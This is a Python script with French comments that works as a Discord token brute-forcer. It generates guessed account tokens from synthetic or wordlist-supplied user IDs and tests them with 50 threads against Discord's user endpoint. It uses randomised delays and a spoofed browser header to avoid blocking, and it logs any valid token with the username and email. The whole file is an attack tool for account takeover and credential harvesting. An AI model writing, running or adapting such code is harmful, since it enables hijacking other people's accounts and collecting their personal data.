import requests
import random
import string
import threading
import time
import os
import base64
import struct
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

# Fichiers pour stocker les résultats
VALID_TOKENS_FILE = "valid_tokens.txt"
INVALID_TOKENS_FILE = "invalid_tokens.txt"
CHECKED_TOKENS_FILE = "checked_tokens.txt"

# Nombre de threads à utiliser
MAX_THREADS = 50

# Délai entre les requêtes (en secondes)
REQUEST_DELAY = 0.5

class TokenChecker:
    def __init__(self):
        self.valid_tokens = set()
        self.invalid_tokens = set()
        self.checked_tokens = set()
        self.load_existing_tokens()
        self.lock = threading.Lock()
        self.success_count = 0
        self.total_checked = 0
        self.start_time = time.time()
        
    def load_existing_tokens(self):
        """Charge les tokens déjà vérifiés pour éviter de les revérifier"""
        try:
            if os.path.exists(VALID_TOKENS_FILE):
                with open(VALID_TOKENS_FILE, 'r') as f:
                    self.valid_tokens = set(line.strip() for line in f.readlines())
            
            if os.path.exists(INVALID_TOKENS_FILE):
                with open(INVALID_TOKENS_FILE, 'r') as f:
                    self.invalid_tokens = set(line.strip() for line in f.readlines())
            
            if os.path.exists(CHECKED_TOKENS_FILE):
                with open(CHECKED_TOKENS_FILE, 'r') as f:
                    self.checked_tokens = set(line.strip() for line in f.readlines())
            
            print(f"Chargement terminé : {len(self.valid_tokens)} tokens valides, {len(self.invalid_tokens)} tokens invalides")
        except Exception as e:
            print(f"Erreur lors du chargement des tokens : {e}")
    
    def save_token(self, token, is_valid):
        """Sauvegarde un token dans le fichier approprié"""
        with self.lock:
            if is_valid:
                self.valid_tokens.add(token)
                with open(VALID_TOKENS_FILE, 'a') as f:
                    f.write(f"{token}\n")
                self.success_count += 1
                print(f"\n[SUCCÈS] Token valide trouvé: {token}")
            else:
                self.invalid_tokens.add(token)
                with open(INVALID_TOKENS_FILE, 'a') as f:
                    f.write(f"{token}\n")
            
            self.checked_tokens.add(token)
            self.total_checked += 1
            with open(CHECKED_TOKENS_FILE, 'a') as f:
                f.write(f"{token}\n")
                
            # Afficher les statistiques
            elapsed = time.time() - self.start_time
            rate = self.total_checked / elapsed if elapsed > 0 else 0
            print(f"\rTestés: {self.total_checked} | Valides: {self.success_count} | Taux: {rate:.2f}/s", end="")
    
    def encode_id_to_base64(self, user_id):
        """Convertit un ID Discord en base64 pour la première partie du token"""
        try:
            user_id = int(user_id)
            bytes_id = user_id.to_bytes(8, byteorder='big')
            # Enlever les zéros au début
            bytes_id = bytes_id.lstrip(b'\x00')
            encoded = base64.standard_b64encode(bytes_id).decode('utf-8')
            return encoded
        except Exception as e:
            print(f"Erreur d'encodage: {e}")
            return None
    
    def generate_timestamp_part(self):
        """Génère la partie timestamp du token"""
        # Prendre une date aléatoire des 2 dernières années
        days_ago = random.randint(0, 730)  # ~2 ans en jours
        timestamp = datetime.now() - timedelta(days=days_ago)
        
        # Convertir timestamp en base64
        timestamp_ms = int(timestamp.timestamp() * 1000)
        encoded = base64.standard_b64encode(struct.pack('>Q', timestamp_ms)).decode('utf-8')
        return encoded
    
    def generate_hmac_part(self):
        """Génère la partie HMAC du token"""
        # Pour la partie HMAC, on utilise 27 caractères aléatoires qui correspondent aux
        # caractères permis dans base64 (A-Za-z0-9+/)
        return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits + "+/", k=27))
    
    def generate_token(self, user_id=None):
        """Génère un token Discord complet avec encodage base64 correct"""
        # Si pas d'ID spécifié, en générer un plausible
        if user_id is None:
            # Les IDs Discord sont des snowflakes qui ont commencé vers 2015
            epoch = 1420070400000
            
            # Privilégier les IDs récents (plus susceptibles d'être actifs)
            year_ranges = [
                (2020, 2025, 60),  # 60% de chance pour les IDs récents
                (2018, 2020, 25),  # 25% de chance pour les IDs médians
                (2015, 2018, 15)   # 15% de chance pour les IDs anciens
            ]
            
            selected_range = random.choices([0, 1, 2], weights=[r[2] for r in year_ranges], k=1)[0]
            start_year, end_year, _ = year_ranges[selected_range]
            
            start_timestamp = int(datetime(start_year, 1, 1).timestamp() * 1000)
            end_timestamp = int(datetime(end_year, 12, 31).timestamp() * 1000)
            timestamp = random.randint(start_timestamp, end_timestamp)
            
            # Calculer l'ID basé sur le timestamp et ajouter des bits aléatoires
            user_id = ((timestamp - epoch) << 22) | (random.randint(0, 31) << 17) | (random.randint(0, 31) << 12) | random.randint(0, 4095)
        
        # Première partie: ID encodé en base64
        part1 = self.encode_id_to_base64(user_id)
        if not part1:
            # Fallback si l'encodage échoue
            return None
        
        # Deuxième partie: timestamp encodé en base64
        part2 = self.generate_timestamp_part()
        
        # Troisième partie: HMAC encodé en base64
        part3 = self.generate_hmac_part()
        
        # Assembler le token au format Discord
        token = f"{part1}.{part2}.{part3}"
        
        # Remplacer les caractères non conformes pour les tokens Discord
        # Base64 standard utilise +/ mais Discord utilise -_
        token = token.replace('+', '-').replace('/', '_').replace('=', '')
        
        return token
    
    def check_token(self, token):
        """Vérifie si un token Discord est valide"""
        if token in self.checked_tokens:
            return  # Token déjà vérifié
        
        if not token or '.' not in token:
            return  # Token invalide
        
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            is_valid = response.status_code == 200
            if is_valid:
                # Tenter d'obtenir des informations sur le compte
                try:
                    user_data = response.json()
                    user_info = f"Utilisateur: {user_data.get('username')}#{user_data.get('discriminator')} | ID: {user_data.get('id')} | Email: {user_data.get('email')}"
                    print(f"\n[INFO] {user_info}")
                    
                    # Sauvegarder plus d'informations pour les tokens valides
                    with open("valid_tokens_details.txt", "a") as f:
                        f.write(f"{token} | {user_info}\n")
                except:
                    pass
            
            self.save_token(token, is_valid)
            
            # Délai adaptatif pour éviter d'être bloqué
            time.sleep(REQUEST_DELAY * (1 + random.random()))
            
        except Exception as e:
            # En cas d'erreur de connexion, attendre plus longtemps
            time.sleep(REQUEST_DELAY * 2)
    
    def run(self, num_tokens=1000, use_wordlist=False, wordlist_file=None):
        """Exécute le vérificateur de tokens"""
        print(f"Démarrage de la vérification de {num_tokens} tokens...")
        self.start_time = time.time()
        
        # Utiliser des IDs connus si une wordlist est fournie
        user_ids = []
        if use_wordlist and wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, 'r') as f:
                    user_ids = [line.strip() for line in f.readlines()]
                print(f"Wordlist chargée avec {len(user_ids)} IDs d'utilisateur")
            except Exception as e:
                print(f"Erreur lors du chargement de la wordlist: {e}")
                use_wordlist = False
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            for i in range(num_tokens):
                # Stratégies de génération
                if use_wordlist and user_ids and i < len(user_ids):
                    # Utiliser un ID de la wordlist
                    user_id = user_ids[i]
                    token = self.generate_token(user_id)
                else:
                    # Utiliser la génération améliorée
                    token = self.generate_token()
                
                if token and token not in self.checked_tokens:
                    executor.submit(self.check_token, token)
        
        elapsed = time.time() - self.start_time
        print(f"\nVérification terminée en {elapsed:.2f} secondes.")
        print(f"Résultats: {len(self.valid_tokens)} valides, {len(self.invalid_tokens)} invalides")
        print(f"Taux de succès: {self.success_count/max(1, self.total_checked)*100:.2f}%")
        print(f"Vitesse moyenne: {self.total_checked/max(1, elapsed):.2f} tokens/seconde")

if __name__ == "__main__":
    # Créer les fichiers s'ils n'existent pas
    for file in [VALID_TOKENS_FILE, INVALID_TOKENS_FILE, CHECKED_TOKENS_FILE]:
        if not os.path.exists(file):
            open(file, 'w').close()
    
    checker = TokenChecker()
    
    try:
        print("=== Vérificateur de Tokens Discord ===")
        print("1. Génération standard améliorée")
        print("2. Utiliser une liste d'IDs (wordlist)")
        choice = input("Choisissez une méthode (1/2): ")
        
        use_wordlist = choice == "2"
        wordlist_file = None
        
        if use_wordlist:
            wordlist_file = input("Chemin vers la wordlist d'IDs Discord: ")
        
        num_tokens = int(input("Combien de tokens voulez-vous vérifier? "))
        checker.run(num_tokens, use_wordlist, wordlist_file)
    except KeyboardInterrupt:
        print("\nArrêt du programme...")
    except ValueError:
        print("Veuillez entrer un nombre valide")
        checker.run(1000)